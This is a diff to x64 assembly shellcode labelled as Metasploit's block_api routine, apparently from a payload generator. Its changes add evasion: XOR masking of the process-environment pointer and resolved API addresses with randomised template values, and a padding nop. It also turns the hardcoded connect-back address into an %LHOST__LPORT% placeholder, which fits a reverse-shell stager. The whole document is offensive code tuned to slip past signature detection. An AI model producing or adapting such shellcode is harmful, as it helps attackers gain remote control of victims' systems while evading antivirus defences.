@@ -14,10 +14,10 @@ metasploit_block_api:
     xor rdx,rdx
     xor rax,0x9f
     mov rax,[gs:rax] ; 0x60
-    xor rax,%RANDOM_1%
+    xor rax,%RANDOM__1%
     push rcx
     mov rdx,rax
-    xor rdx,%RANDOM_1%
+    xor rdx,%RANDOM__1%
     ; mov rdx,[rax+0x60]
     mov rdx,[rdx+0x18]
     xor rdx,rax
@@ -29,7 +29,7 @@ metasploit_block_api:
 load_module_name:
     xor r9,r9
     mov rsi,[rdx+0x50]
-    movzx rcx,word [rdx+0x4a]
+    movzx rcx, word [rdx+0x4a]
 
 module_hash_loop:
     xor rax,rax
@@ -40,6 +40,7 @@ module_hash_loop:
 skip_case_adjustment:
     ror r9d,%ROR_VALUE%
     add r9d,eax
+    nop
     loop module_hash_loop
 
 is_valid_module:
@@ -88,8 +89,9 @@ final:
     mov cx,[r8+rcx*2]
     mov r8d,[rax+0x1c]
     add r8,rdx
-     mov eax,[r8+rcx*4]
+    mov eax,[r8+rcx*4]
     add rax,rdx
+    xor rax,%RANDOM__2%
     pop r8
     pop r8
     pop rsi
@@ -98,8 +100,9 @@ final:
     pop r8
     pop r9
     pop r10
-    sub rsp,byte +0x20
+    sub rsp,byte 0x20
     push r10
+    xor rax,%RANDOM__2%
     jmp rax
 
 pre_load_next_module:
@@ -117,7 +120,7 @@ save_beginning:
     mov r14,rsp  ; @ -> chaine au dessus
     sub rsp,0x1a0
     mov r13,rsp
-    mov r12,0x2e297225bb010002
+    mov r12,%LHOST__LPORT%0002 ; 4 bytes for IP, 2 for the port
     push r12
     mov r12,rsp
     mov rcx,r14
